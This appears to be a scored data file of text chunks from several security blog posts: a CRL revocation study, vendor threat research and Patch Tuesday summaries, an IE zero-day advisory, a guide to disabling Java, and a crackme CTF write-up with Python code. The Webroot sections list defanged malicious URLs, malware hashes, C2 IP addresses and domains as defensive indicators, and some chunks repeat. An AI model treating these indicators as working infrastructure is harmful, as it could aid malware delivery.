"The data shows that http://crl.globalsign.net/Root.crl is the most popular URL during that hour, which demonstrates that the most certificates verified at that time were issued by “Globalsign”. This is probably because this is the root CA of “Globalsign”, and it writes this URL as the certificate distribution point (CDP) for each certificate issued.
From those 819 unique URLs, we managed to download 511 CRL files.It is not a surprise that some of the URLs are just not responding. First, let us look at the size of these CRL files:",0.012354574458170675
"The minimum file size among these 511 files is 236 bytes, while the maximum file size is, amazingly, 26.8 MB (28,198,759 bytes). Among these 511 CRL files, 200 files are below 1000 bytes, which shows that most CRL file are small in size.
Remember a CRL file is used to contain revoked certificates, so let us check how many certificate records these CRL files have:",0.02174875174268287
"Surprisingly, the biggest CRL file contains 687762 records, while 107 files do not have even one record. In total, these 511 files contain 2232845 revoked certificate records, which means over 2 million files are listed as being “untrusted”.
Each CRL file is issued by one CA server, and one CA server can issue as many CRLs as it likes. When we check all of those CRL files, we find some of them are issued by the same CA: below is some statistical data about which CA issued the most CRL files:",0.0148424790325411
"The top 3 issuers are GoDaddy, Digicert, and Starfield.  GoDaddy issued 86 of the 511 CRL files.
Each CRL file should choose its own algorithm for hash and encryption. In reality, the most popular used is “sha1WithRSAencryption”, which means use “sha1” as the hashing algorithm, and use “RSA” as the encryption algorithm. But other algorithms are used too, as shown here:",0.01293720247181529
"We can see that “sha1WithRSAEncryption” is the predominant signature algorithm currently used. Though “sha256” and “sha512” are perhaps more secure, sha1 is just safe enough.
Each CRL file contains a list of serial numbers for revoked certificates, which is like a blacklist for certificates. There is no standard specification for how to represent these serial numbers; it is up to the CA server, so different CAs use different lengths for this field.",0.016959453173938432
"Some CAs use 1 byte for the serial number, while others use 26 bytes to represent this field, but we could tell from the chart that 8 bytes is the most preferred length and 16 bytes is also a popular choice. When developing tools for parsing CRL files, in order to avoid mistakes we should keep in mind that the serial number could be any length. In fact, when parsing data using OpenSSL, we identified a bug in the “openssl crl” tool:",0.011219251808133546
"Windows can successfully parse the special CRL file “MicrosoftRootAuthority.crl” and display the correct result of revoked certificates’ serial numbers; however, when OpenSSL parses this file it shows negative serial numbers, which is not correct.
Certificates are revoked for many reasons, for example, a certificate's private key is compromised, the CA server is compromised, etc. There is a detailed list of revocation reasons at RFC 5280. Among all 2232845 records of certificate serial numbers, there are 1606045 records which specified a revocation reason:",0.015419035837849537
"From this data, we saw some interesting findings. “Key Compromise” is the top reason for revocation, taking up 44% of all revoked certificates which reminds all certificate holding companies that stolen keys is quite a serious problem and they should take care of their private keys. There are 61 records for “CA Compromise”, which reminds us of the security of CA servers: in 2011, the SSL CA Comodo was breached, in an exploit originally identified as a nation state attack sponsored by the government of Iran. The SSL CA DigiNotar was also breached in 2011 in an exploit that enabled attackers to issue fraudulent certificates for Google.com. Earlier this year, the SSL CA TURKTRUST also issued illegitimate SSL certificates for Google.com.
Each revoked certificate record specifies the revocation date. By profiling this data, we could discover the trend of certificate revocation problem, and make some predictions about certificate security issues. Let us take a look at the following chart, which demonstrates the number of revoked certificates for each year.",0.01381064793018405
"The earliest record of certificate revocation happens in 2000, and the number of revoked certificates grows every year, reaching 1045518 in 2012. During the first 5 months of 2013, the number is 766451, and we can guess by the end of 2013, the number will easily exceed 2012’s. From this data we can tell that more certificates get revoked each year, and we can make a guess that this number will keep growing in the next few years.
It is no doubt that revocation checking is very important for certificate verification, but many certificate verification tools do not check it at all during the verification process. Here are some interesting facts about certificate revocation checking:
1. Internet Explorer on Windows XP does not offer support for OCSP, thus Internet Explorer only supports OCSP on Windows Vista and later.
2. Internet Explorer on Windows XP does not check certificate revocation for web servers by default.
Go to Tools > Internet Options > Advanced to find the two options which control revocation checking. Check for server certificate revocation controls (whether revocation checks occur for HTTPS connections) and for publisher’s certificate revocation controls (whether revocation checks occur when validating the Authenticode digital signatures on downloaded programs and ActiveX controls).",0.01770354899966653
"By default, Windows Vista and later enable revocation checks in both scenarios, while Internet Explorer on Windows XP only enables Authenticode Revocation checking by default because of the performance impact of downloading CRLs for HTTPS connections.
3. When Internet Explorer checks certificate revocations on Windows Vista or later, if a given certificate specifies a CRL or OCSP URL, but the revocation check cannot be completed (i.e. the Certificate Authority’s server is not reachable), Internet Explorer will not notify the user.
4. Some well-known browsers like Chrome do not even check server revocation by default.
All these lead to security risks when doing certificate verification. In fact, a lot of work has been done by Windows to improve the safety of the certificate revocation process, even though it is hard to completely eradicate all security risks. We suggest our customers use newer versions of operating systems and browsers, which could mitigate those risks in some ways.
Websense can successfully protect customers on these issues.
Websense ACE™, our Advanced Classification Engine, does a complete certificate verification when doing file classification: during this verification process, it downloads and parses CRL files to check certificate revocation state, and what’s more, it even implements a cache mechanism to speed up this checking process. For some vulnerabilities discovered by the public during certificate verification process, Websense ACE has carefully checked itself to make sure all vulnerabilities are correctly patched - for example take MS12-024/CVE-2012-0151, where ACE has implemented counter measures into its code based on detailed analysis, thus it won’t be fooled by malicious samples. ThreatSeeker® Intelligence Cloud also successfully handles these security issues, all digital signatures are carefully verified and the certificate revocation state is correctly checked.
",0.015725709867746684
Cybercriminals shift their tactics for Microsoft Office document exploitation – SophosLabs research,0.00951797758408468
"Written by
Editor",0.007990427730288352
"July 18, 2016",0.008790310083003128
Threat Research CVE-2015-1641 CVE-2015-2545. SophosLabs,0.00816386123646684
"This latest technical paper from our team in SophosLabs examines the newest techniques being used by cybercriminals to conduct Microsoft Office document exploits.
For four years, the preferred vulnerability for a document exploit attack was CVE-2012-0158, but as this vulnerability has aged out – due to users and administrators updating and patching their systems to remediate it – criminals have had to target new vulnerabilities to keep up their attacks.
SophosLabs has found that criminals using several popular exploit kits, including Microsoft Word Intruder, are now predominantly targeting CVE-2015-1641 and CVE-2015-2545.",0.013335954094747637
"Along with these new vulnerabilities, these Microsoft Office document exploit kits also have strengthened their tactics and added new complexities to their attacks. For example, the newest version of the Microsoft Word Intruder now includes the ability to deploy a decoy document, as well as new payload files that are relocated to the end of the exploit block. The decoy document allows the attackers to better hide their tracks while the exploit is at work.
Despite all these changes, one thing that hasn’t really changed is the delivery system. These exploits are still sent via email – regardless of whether it’s a 0-day targeted attack or a large-scale attack on a wide audience.
These emails use common social engineering methods to urge the recipient to open the malicious attachment, which generally looks like a Microsoft Word document in DOCX format. Often the payload from these attacks will point the victim to a command-and-control server that hosts webpages to phish additional credentials, such as email, from the victim.
For an in-depth examination of exploit kits using CVE-2015-1641 and CVE-2015-2545, be sure to download the paper, as well as all our other SophosLabs research, on our technical papers page.
About SophosLabs
SophosLabs is the global network of threat centers staffed by Sophos researchers and analysts.
You can find our industry-leading research and technical papers, expert opinion, and security advice at Naked Security and right here on the Sophos Blog.
Sign up for our Sophos Blog newsletter, follow us on your favorite social media networks, chat with us in our forums, download our informative podcasts, or sign up for our RSS feeds.",0.01328251035978989
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"August, 2019 Patch Tuesday Targets Remote Desktop and Active Directory",0.008589706845372747
"Written by
SophosLabs Offensive Security",0.008622298185940958
"August 30, 2019",0.008433120449275577
SophosLabs Uncut Threat Research ChakraCore DHCP Edge Hyper-V Internet Explorer Patch Tuesday RDP Windows,0.010210971419036041
"Among the 94 vulnerabilities fixed this month by Microsoft, 29 are rated as Critical. Most importantly, the Remote Desktop Protocol (RDP) and its associated service (RDS) collect a total of 6 CVEs, which seems to show a renewed interest in the RDP protocol by vulnerability researchers; two of those classified as wormable (CVE-2019-1181 and CVE-2019-1182) by Microsoft.
Additional details can be found in the Microsoft Security Update Guide.
In addition, the company released two advisories about Active Directory, ADV190014 (Critical) and ADV190023 (Important).
This month major updates cover vulnerabilities in the following components:",0.013084921194005172
"Remote Desktop Protocol / Remote Desktop Services
Hyper-V
DHCP
Internet Explorer, Edge & ChakraCore
Microsoft Office
Microsoft Windows kernel (RPC, GDI, WSL)
Jet Database Engine
Visual Studio
Windows VBScript Engine",0.01587213157183598
"All of the critical vulnerabilities should be patched, as they may enable a successful attacker to take over the targeted system/service with a high level of privilege, which can later be used to compromise a network further.
The vulnerabilities CVE-2019-1181 and CVE-2019-1182 turn out to be particular nasty as only any Windows OS supporting RDP8 or RDP8.1 (Windows 7 through 10, including Server) are, by default, impacted. Network admins can enable Network Level Authentication (aka. NLA) to slow down an attacker, but NLA will not provide sufficient protection to entirely mitigate these vulnerabilities.
Affected systems that have Network Level Authentication (NLA) enabled prevent “wormable” malware or advanced malware threats that could exploit the vulnerability, as NLA requires authentication before the vulnerability can be triggered. However, affected systems are still vulnerable to Remote Code Execution (RCE) exploitation if the attacker has valid credentials that can be used to successfully authenticate.",0.012486134596848442
"Important updates this month
Remote Desktop Services: Following up the trend started by the “BlueKeep” vulnerability reported last May, this month PT fixes CVE-2019-1181 and CVE-2019-1182: two remote code execution vulnerabilities within the Remote Desktop Services – formerly known as Terminal Services. As with BlueKeep, little information was publicly disclosed by Microsoft, which considered the vulnerabilities wormable; but unlike BlueKeep, the vulnerabilities affect all Windows from 7 to 10. Although NLA would provide a temporary workaround to exploiting them (by forcing attacker to successfully authenticate first), the only way to secure the RDP service is by patching it. An unauthenticated successful attacker who exploited this vulnerability can execute arbitrary code on the targeted system, with the highest level of usermode privilege.
Hyper-V: An input validation issue in the VMSwitch component of Hyper-V is what an attacker could exploit in a Hyper-V guest VM to achieve remote code execution onto the Hyper-V host (designated as CVE-2019-0720). Although its exploitability was marked as “less likely”, its impact highly encourages to apply MS patches as soon as possible, along with the other Hyper-V related CVEs issued this month: CVE-2019-0714, CVE-2019-0717, CVE-2019-0718, CVE-2019-0720, CVE-2019-0715,CVE-2019-0723 and CVE-2019-0965.
Web browsers and JS engine: A total of 10 vulnerabilities affecting ChakraCore (the Edge browser JavaScript engine), Edge, and Internet Explorer were patched this month. Memory Corruption Vulnerabilities: ChakraCore and Internet Explorer were found vulnerable to a range of vulnerabilities, from simple information to type confusion vulnerability. By simply visiting a web page embedding an exploitation payload, a user can unwillingly allow an attacker to execute code with their level of privileges. The company’s patch addresses vulnerabilities with the following designations: CVE-2019-1131,CVE-2019-1139,CVE-2019-1140,CVE-2019-1141,CVE-2019-1195,CVE-2019-1196,VE-2019-1197,CVE-2019-1193,CVE-2019-1192 and CVE-2019-1030.
DHCP: DHCP has been under scrutiny over the last several months. Therefore this month is not spared with some new vulnerabilities discovered in both the Windows DHCP client and server. Despite the complexity of reliable exploitation, exploiting those vulnerabilities would result in Denial of Service, or potentially code execution. The CVEs assigned are the following: CVE-2019-0736, CVE-2019-1206, CVE-2019-1212, and CVE-2019-1213.
Windows Kernel: As usual the Windows was patched in several locations: Elevation of Privilege (EoP) in various internal components such as RPC runtime or the GDI were fixed (CVE-2019-1173,CVE-2019-1174,CVE-2019-1175,CVE-2019-1177,CVE-2019-1178,CVE-2019-1179,CVE-2019-1180,CVE-2019-1184,CVE-2019-1186,CVE-2019-1159,CVE-2019-1164,CVE-2019-1227,CVE-2019-1228, CVE-2019-1143,CVE-2019-1154,CVE-2019-1158).
How is Sophos responding to these threats?
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.",0.016525791338654283
"CVE
SAV
IPS
Intercept-X",0.010185298729769032
"CVE-2019-1141
Exp/20191141-A
2200885
N/V",0.01056843718513012
"CVE-2019-1196
Exp/20191196-A
2201342
N/V",0.008731554843424139
"N/V = Not Validated. The PoC code provided with MAPP advisories does not include active exploits and as such is not applicable to Intercept X testing. The IX ability to block the exploit depends on actual exploit weaponization approach which we won’t see until it’s spotted in the wild. The SAV and IPS detections developed for the PoCs do not guarantee interception of in-the-wild attacks
Additional IPS Signatures
Microsoft",0.008517279057136284
CVE,0.015603552773460372
SID,0.008271028222603172
"CVE-2019-1139
2201340",0.009218131301729326
"CVE-2019-1140
2201341",0.009193354397430298
"CVE-2019-1141
2200885",0.009394674694046201
"CVE-2019-1195
2200885",0.009419138865671028
"CVE-2019-1197
2200885",0.009193386828582284
"CVE-2019-1199
2201343",0.00832989068651957
"CVE-2019-1201
35190",0.008595288117815292
Adobe,0.00940443541059821
"CVE
SID",0.008611871716647679
"CVE-2019-7832
3310867",0.009244256757765412
"CVE-2019-7965
9000957",0.01016592148837514
"CVE-2019-8005
49294",0.008405509746782891
"CVE-2019-8009
4300087",0.008926543233158224
"CVE-2019-8011
44059",0.008764001770416696
"CVE-2019-8025
26021",0.009126470927575014
"CVE-2019-8029
2201201",0.009143094455552614
"CVE-2019-8035
2200337",0.009324358982949699
"CVE-2019-8045
3310026",0.009591453604894218
"CVE-2019-8047
39873",0.00909378005493433
"CVE-2019-8098
2201224",0.008446125583414732
"CVE-2019-8099
9000941",0.009891388958561675
"CVE-2019-8100
9000929",0.009978086611758918
"CVE-2019-8101
9000941",0.009991674512322413
"CVE-2019-8103
9000941",0.010373857361683392
"CVE-2019-8105
2201217",0.008599274192028217
"CVE-2019-8106
9000941",0.00987802687285566
How long does it take to have Sophos detection in place?,0.012841079453727255
"We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.",0.012826930866143504
"What if the vulnerability/0-day you’re looking for is not listed here?
If we haven’t released an update for a specific exploit, the most likely reason is that we did not receive the data that shows how the exploit works in the real world. As many of this month’s exploits were crafted in a lab and have not been seen in the wild, nobody has enough information (yet) about how criminals would, hypothetically, exploit any given vulnerability. If or when we receive information about real attacks, we will create new detections, as needed.",0.011427794767576605
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Microsoft warns against new Internet Explorer Zero-Day UPDATED
Update (May 1, 2014): Microsoft has decided to release an out-of-band security update for CVE-2014-1776 and, in a surprising move, is also issuing one for the not-so retired Windows XP.",0.013028302900680466
"We have made the decision to issue a security update for Windows XP users. Windows XP is no longer supported by Microsoft, and we continue to encourage customers to migrate to a modern operating system, such as Windows 7 or 8.1. Additionally, customers are encouraged to upgrade to the latest version of Internet Explorer, IE 11.",0.015471330377238912
"– –
Original story:
Security researchers have discovered a new vulnerability affecting Microsoft Internet Explorer from version 6 to 11 on practically all the different Windows operating systems, including the latest, Windows 8.1.
Microsoft issued a security advisory for this flaw (CVE-2014-1776) which could allow remote code execution simply by browsing to a compromised website.
The advisory does not mention Windows XP in the list of systems affected, since it has officially been retired and is no longer supported.
But since Internet Explorer 6, 7 and 8 are also exploitable, this Zero-Day is not only bad news for everyone, but more so for XP users who will not receive a patch from Microsoft.
Details on the vulnerability are still scarce, but security firm FireEye says that this is another move from the same gang that already exploited use-after-free vulnerabilities in targeted attacks.
To mitigate this attack, users have several options:",0.012636823500336236
"Run Internet Explorer in “Enhanced Protected Mode”  (IE10 and IE11).
Disable the Flash Plugin in IE (this Zero-Day uses the Flash Player to exploit IE).
Download and install Microsoft’s Enhanced Mitigation Experience Toolkit (EMET). Note that earlier versions of EMET (<=3.0) are ineffective against this Zero-Day.
Switch to a different browser (this is especially true if you are running XP).
Install Malwarebytes Anti-Exploit, a non-intrusive and proactive shield for browsers and applications against known and unknown vulnerabilities (if you run Anti-Exploit, you do not need to run EMET at the same time as they may conflict with one another).",0.01749113941834446
"This is the first ‘official’ Zero-Day post Windows XP’s End of Life and it certain won’t be the last.
While as far as we know this Zero-Day has only been used in very targeted attacks, you can count on seeing it getting integrated into an exploit kit very soon, meaning a wide distribution to potentially millions of computers.
@jeromesegura
",0.011467834373573793
"Remember the IRS (Internal Revenue Service) themed malicious campaign profiled at Webroot’s Threat Blog earlier this month?
Over the past 24 hours, the cybercriminals behind the campaign resumed mass mailing of the same IRS email template, exposing millions of users to the threats posed by the social engineering driven campaign.
More details:",0.017978999534920548
Sample screenshot of the spamvertised email:,0.010990132234593664
"Upon clicking on the link, users are exposed to the following bogus “Page loading…” page:",0.010310956564353213
"Spamvertised malicious URLs hosted on compromised hosts: hxxp://feterouge.info/wp-content/plugins/rejrev.html; hxxp://jasnoiglasno.com/wp- content/plugins/zooexojfeix/intrev.html; hxxp://businesspromotesolutions.com/admin/irser.html; hxxp://www.aquitato.net/v3/wp-content/plugins/zvncekcolnx/revnse.html; hxxp://atdcindia.com/COFFEE/revnse.html; hxxp://xerby.com/irsrev.html; hxxp://myoushinji.com/irsrev.html; hxxp://room-4-dessert.com/heb/wp-
content/plugins/zeoebikeoou/irser.html; hxxp://evrootdelka.tom.ru/txpo.html; hxxp://wholefoodmall.9138.8008202191.com/txpo.html
Detection rate for a sample java script redirection: MD5: 8c5ee1902b4429ce303530f37115854a – detected by 1 out of 41 antivirus scanners as Mal/Iframe-W
Sample exploits serving landing URls: hxxp://immigrationunix.pro/main.php?page=28677a727aff0456; hxxp://bikeslam.net/main.php?page=8b89c7278770dfd7; hxxp://market-panel.net/main.php?page=8b89c7278770dfd7; hxxp://steampoweredprobability.pro/main.php?page=e55871a71c789475; hxxp://wireframeglee.info/main.php?page=39630332cf486f5a; hxxp://wireframeglee.info/main.php?page=39630332cf486f5a; hxxp://allhugedeals.net/main.php?page=ca16f7c53056850e
Sample exploits served: CVE-2010-0188; CVE-2010-1885
Upon successful client-side exploitation, the campaign drops MD5: 42307705ad637c615a6ed5fbf1e755d1 – detected by 34 out of 42 antivirus scanners as Trojan.Win32.Yakes.ansm; Trojan:Win32/Coremhead, MD5: 027b7e4f2a34ccea32ffe38c35a20903 – detected by 20 out of 42 antivirus scanners as Worm:Win32/Cridex.E; Trojan- Dropper.Win32.Dapato.bpqt, MD5: 29cd72608b456c87d91809132401379d – detected by 20 out of 42 antivirus scanners as Trojan.Dropper.Agent.VJQ, MD5: cc7ce4552794d3e4c28e8986bec469c2 – detected by 34 out of 42 antivirus scanners as Trojan.Win32.Yakes.aonc; Trojan:Win32/Malagent, MD5: b8e0ffb6591f6ab556575e4d65e9fed1 – detected by 1 out of 28 antivirus scanners as Trojan-PSW.Win32.Tepfer.babg.
Upon execution, the samples phone back to 192.5.5.241:8080/mx5/B/in; 87.120.41.155:8080/mx5/B/in. We’ve already seen malware phoning back to the same IP (87.120.41.155) in the recently profiled “Cybercriminals spamvertise bogus greeting cards, serve exploits and malware“, and the “Spamvertised ‘Fwd: Scan from a Hewlett-Packard ScanJet’ emails lead to Black Hole exploit kit” campaign.
Responding to 87.120.41.155 are the following malicious domains and command and control servers:
horoshovsebudet.ru
kamarovoskorlovo.ru
serebrokakzoloto.ru
cojsdhfhhlsl.ru
geekstuffmag.com
vzhpiaswhqlswkji.ru
insomniacporeed.ru
We’ll continue monitoring the development of the campaign.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.011516317446699675
"Cybercriminals are currently spamvertising millions of emails impersonating the popular Craigslist site, in an attempt to trick users into clicking on client-side exploits and malware serving URLs courtesy of the Black Hole exploit kit.
More details:",0.014598459246253137
Screenshot of the spamvertised email:,0.01024206182675269
"Spamvertised URls: hxxp://institut66.fr/genidpo.html; hxxp://tomix.cal24.pl/lidcr.html; hxxp://well-ship.com/genidpo.html; hxxp://www.windscreen-wiper.com/lidcr.html; hxxp://wzm1982.com.cn/lidcr.html; hxxp://iconnectzone.com/wp-includes/waral.html
Client-side exploits serving URL: hxxp://historyalmostany.org/main.php?page=ed0a25d616022c57 – 221.131.129.200
Upon clicking on the links, users are exposed to the following bogus “Page loading…” page:  Client-side exploits served: CVE-2010-1885
Detection rate for a sample malicious Javascript redirection script with MD5: 89b7b3834aeee20658d04adccfe61438, and detection rate for a sample malicious script found on a landing URL with MD5: 50e000b7d2d990951d4588c8e2147ceb
Upon successful client-side exploitation the campaign drops MD5: ffa297ff8f942dc65db5290311799bf6 detected by 3 out of 41 antivirus scanners as Trojan.PWS.Panda.2523; Malware.Cridex.
Once executed, the sample phones back to 87.204.199.100/mx5/in/ on port 8080.
Responding to 87.204.199.100 are the following command and control servers used in the malicious campaign:",0.010648479040982095
"nolwzyzsqkhjkqhomc.ru
eoicszuwkjskhvki.ru
mceglkuyhzvzjxbj.ru
wbgguucrbkrkjftn.ru
usepaxvulfdtnwiwwk.ru
sushfpappsbf.ru girlsnotcryz.ru
monashkanasene.ru
harmoniavslove.ru
huletydyshish.ru
piloramamoskow.ru
hamlovladivostok.ru
spbfotomontag.ru
forumenginesspb.ru
insomniacporeed.ru
ns1.inetgo.pl
ns2.inetgo.pl
psychoza.eu
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.01277024304678076
"Java zero day = time to disable Java, in your browser at least
Now is the time to disable Java in your web browser, or even remove it from your system if that is practical. Why? The bad guys are hard at work trying to exploit a zero day vulnerability in the latest version of Java (version 1.7, Update 6.). This vulnerability is the subject of a US-CERT",0.010964589124259017
29 Aug 2012 - 12:34PM,0.011477527072945026
"Now is the time to disable Java in your web browser, or even remove it from your system if that is practical. Why? The bad guys are hard at work trying to exploit a zero day vulnerability in the latest version of Java (version 1.7, Update 6.). This vulnerability is the subject of a US-CERT",0.010048923284502798
"Now is the time to disable Java in your web browser, or even remove it from your system if that is practical. Why? The bad guys are hard at work trying to exploit a zero day vulnerability in the latest version of Java (version 1.7, Update 6.). This vulnerability is the subject of a US-CERT Alert (TA12-240A) and ESET researchers have been able to confirm that the Blackhole exploit kit, popular with malware makers, now has the ability to take advantage of the vulnerability.",0.008811593511896754
"We hope to publish a detailed technical analysis of the vulnerability (officially known as  CVE-2012-4681) here on the blog fairly soon, but in the meantime we wanted to provide some practical advice on how to avoid becoming a victim of the malware that is already being deployed to exploit it. The first line of defense is to turn off Java in your web browser, so we have rounded up instructions on how to do that in the major browsers (Chrome, Firefox, Safari, Opera, and Internet Explorer).",0.01309879742238762
"[UPDATE 8/30/2012: Oracle has just announced a Java security update. Although this will fix the CVE-2012-4681 zero day vulnerabilities that prompted this blog post, it does not change our advice that you try living without Java in your browser. If you have Java installed on your Windows system you may want to update to the latest version and then disable it, following the browser disable instructions below. This ensure that any malicious calls to Java which attempt to bypass your browser will encounter the patched version. Mac OS X users who have upgraded to Java 7   should also update to the latest version, but those using Java 6, which was not affected by this latest problem, may want to wait until Apple issues an update.]",0.01203530075185355
Disabling Java in Google Chrome,0.008966213077540974
Google Chrome calls Java a “Plug-in” and to disable Java in Chrome you  can  access your Plug-in settings by entering “chrome://plugins” in the address field (without the quotation marks) as shown here:,0.01182069918902895
"As you can see, Chrome lets you enable or disable each Plug-in that has been installed. Clicking Disable will gray out the Plug-in and prevent it running. As an extra precaution,  restart Chrome after disabling the Java Plug-in.",0.013522554027017852
"Note that  Chrome has an “Always allowed” setting for Plug-ins that are enabled. That’s because Chrome will not, by  default,  automatically execute potentially risky Plug-ins even if they are enabled. Instead, as a security measure,  Chrome will ask permission to execute Plug-ins like Java. You can give permission on a site-by-site basis or activate the “Always allowed” setting. However, I  suggest you  do not choose the “Always allowed” setting, and go ahead with disabling Java anyway.",0.01201966300748436
"Also note that some versions of Chrome  exhibit anomalies in the description of  the Java Plug-in displayed on this page. Don’t be distracted by these, just go ahead and disable.",0.009875795569887602
Disabling Java in Firefox,0.009217906546487686
"The Firefox browser also thinks of Java as a plugin but you disable it through the Add-ons Manager, shown below. You can get to the  Firefox Add-ons Manager by clicking  on the Firefox button at the top of the browser (use the Tools menu if you are using Firefox on Windows XP), and then click Add-ons. The Add-ons Manager tab will open. In the Add-ons Manager tab, select the Plugins panel:",0.012861715999617829
You may have read that Java can be disabled in Firefox for Windows by using the Windows Control Panel. We don’t recommend that  method as it may not be reliable.,0.008629089167456527
Disabling Java in Safari,0.00942404401928254
"The instructions for disabling Java in Safari on a Mac  can be found on this Apple Support page. If you are using Safari on Windows you can disable Java if you select Edit from the main  menu (use the Alt key to display the menu), followed by Preferences. That will get you to the  following dialog box (or use the shortcut keystroke combination of Control  plus the comma key):",0.012140750529515243
"Note that the version of Java  in which this latest vulnerability appears (version 1.7)  may not be installed on your Mac.  Most Macs running Lion or Mountain Lion are running Java 1.6 which is not affected by this particular problem. Apple has not pushed 1.7 to customers and you will only be running Java 1.7 if you  went through the installation process yourself.  Ironically, this is one of those times when the general advice of experts to “upgrade to the latest version to be secure” does not apply.  However, given the eagerness with which the bad guys are digging for vulnerabilities across all versions of Java right now, it makes sense to disable Java in browsers on your Mac regardless of which version you  have installed.",0.012892246112360173
Disabling Java in Opera,0.009433914725239467
You can quickly access and change the plug-in settings in the Opera browser by entering “about:plugins” in the address bar (without quotation marks)  to display this screen:,0.011472525365949005
Disabling Java in IE,0.009362099739277152
"I’d like to say we’ve saved the best for last, but there’s not much to like about disabling Java in IE, something that is clear from the language of the  US-CERT in its notes on this latest Java issue. According to Vulnerability Note VU#636312:",0.008848164569064565
"“Disabling the Java plug-in for Internet Explorer is significantly more complicated than with other browsers. There are multiple ways for a web page to invoke a Java applet, and multiple ways to configure Java Plug-in support.”",0.010685981640252029
"In fact, the task is more than  “complicated” because  one of the widely-cited methods  for turning off Java in IE–using the Programs section of the Control Panel in Windows 7–is not reliable. We tried turning off Java this way on several different machines and found that  the  setting was ignored. The detailed  instructions provided by US-CERT can be quite daunting for the average user, so seek help with this if you are not familiar with editing the Registry.",0.009430995162229339
"Until you can disable Java in IE, avoid using IE as your browser and make sure it is not your default browser (some malware will attempt to execute via  the default browser even if you are not using it).  The easiest way to make a browser other than IE the default in Windows  is to load the browser you want (e.g. Chrome, Safari, or Opera) and make it the default. The steps for doing this vary by browser, but there is a good guide to the  default browser settings here.",0.014543432235764264
Removing Java Completely,0.011287461587379144
"Of course, one solution to the whole  Java-in-my-browser problem is to remove Java  from your computer. The only drawback to this solution is that some applications on your system may require Java. For example, your company may have an internal application it developed with Java or you may use one of the “OpenOffice” productivity suites such as LibreOffice. If you can do without Java completely, use the Programs item on the Windows Control Panel to uninstall any item that begins with “Java”:",0.01428340573257647
What’s Next for Java Malware?,0.01087801205518879
"We do expect that Oracle will release a fix for this vulnerability in the near future so stay tuned for updates on this topic. (Not that we have heard from Oracle on the timing of a patch, but it makes sense that they will release one sooner rather than later, otherwise there won’t be many Java users left to update.)",0.017021541818877828
"We also expect more zero day Java vulnerabilities to appear. And exploitation of those vulnerabilities will happen with considerable speed, as in this case. Why? Because malware is now an industry and as such reaps the rewards of industrial processes, something discussed recently in this article over on SC Magazine’s Cybercrime Corner.
",0.01313061867195997
"MalwareBytes CTF: Capturing the flag I didn’t plan to catch…
May 20, 2018 in CTF",0.009629225775539929
"While browsing Twitter on Friday, April 27th I came across an announcement from @hasherezade about the release of a new crackme that she prepared and published on the MalwareBytes blog. I actually didn’t plan to take a part in it, but somehow I eventually got tempted and decided to give it a go…
Then I won!
But let’s not get ahead of ourselves…
The file in question (mb_crackme_2.exe) is a 8MB executable. Once you see something like this, you… run away. I mean, seriously… well… good we have the sandboxes?
The problem is that in this case it’s a CTF and you need to reverse…
Sigh…
Okay…
So… I checked the file type and… decided to run away again.
PyInstaller… @#$%^&(!)
I hate this stuff :).
It’s an .exe that spawns another .exe and there is a crazy amount of garbage dropped all over the place on the system where the file is executed.
So I try my luck with some decompiling tools I collected in the past. Of course, none worked. That’s actually very typical. But I used them before and knew it’s possible to extract the junk files and then decompile the main code.
Quick google follows for the latest, and the best and it landed me on a github page of In Ming Loh from @countercept.
A-ha. Updated last Nov, pretty new.
Download.
Try.
Fail.
I guess that’s why I don’t like Python ;).
Yup, the script didn’t work, but after quick code analysis (python trace log FTW) I modded it a bit to work and was able to decompile the main file (which was called ‘another’).
Hooray!
The decompiled python script is a battle pretty much won.
So I thought.
I quickly identified Level1 user name hardcoded in the source code: hackerman.
The Password was present only as a hash, but Google helped to identify the hash as being taken from the following string: Password123 .
So, now I have a Login and the Password.",0.015776527476708102
"What about the PIN?
The PIN requires quick thinking – google didn’t return any hits, so I have to brute-force.
Sigh…
I hate writing code in Python…
I love to rip it out from sources though and make it what I want it to do 😉
I ripped the code from the main module and let it go:
import os
import sys
import io
import math
import hashlib
import random
from Crypto.Cipher import AES
from Crypto import Random
unpad = lambda s: s[:-ord(s[len(s) - 1:])]
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
class AESCipher:",0.014451464634065325
"def __init__(self, key):
self.key = ''.join(map(chr, key))",0.014904933151785982
"def encrypt(self, raw):
raw = pad(raw)
cipher = AES.new(self.key, AES.MODE_ECB)
return cipher.encrypt(raw)",0.032416117632847574
"def decrypt(self, enc):
cipher = AES.new(self.key, AES.MODE_ECB)
return unpad(cipher.decrypt(enc))",0.025917159910925802
"def get_url_key(my_seed):
random.seed(my_seed)
key = ''
for i in xrange(0, 32):
id = random.randint(0, 9)
key += str(id)",0.023526323203281296
return key,0.0090168310840254
"def check_key(key):
my_md5 = hashlib.md5(key).hexdigest()
if my_md5 == 'fb4b322c518e9f6a52af906e32aee955':
return True
return False",0.014043008444383442
"PIN=0
while True:
key = get_url_key(int(PIN))",0.009322702668380978
"if check_key(key):
print (PIN)
encrypted_url = '\xa6\xfa\x8fO\xba\x7f\x9d\xe2c\x81`\xf5\xd5\xf6\x07\x85\xfe[hr\xd6\x80?U\x90\x89)\xd1\xe9\xf0<\xfe'
aes = AESCipher(bytearray(key))
output = aes.decrypt(encrypted_url)
print (output)
exit(0)
PIN = PIN+1
It pretty quickly identified the PIN to be 9667.
When submitted I passed the Level1.",0.01590811713435636
"My python code (not really mine, cuz I ripped it out) also printed the URL that was encrypted inside the python code.
The aforementioned URL was the second stage stored at https://i.imgur.com/dTHXed7.png.",0.010597106374435228
"The picture is a garbage, so something must be hidden inside it.
No, don’t salivate yet! IT IS NOT STEGO!!!
Read the python code…
def get_encoded_data(bytes):
imo = Image.open(io.BytesIO(bytes))
rawdata = list(imo.getdata())
tsdata = ''
for x in rawdata:
for z in x:
tsdata += chr(z)",0.0197985939027413
"del rawdata
return tsdata
A-ha…
So.. I downloaded the pic and ripped the above code and put it into another quick& dirty script.
import os
import sys
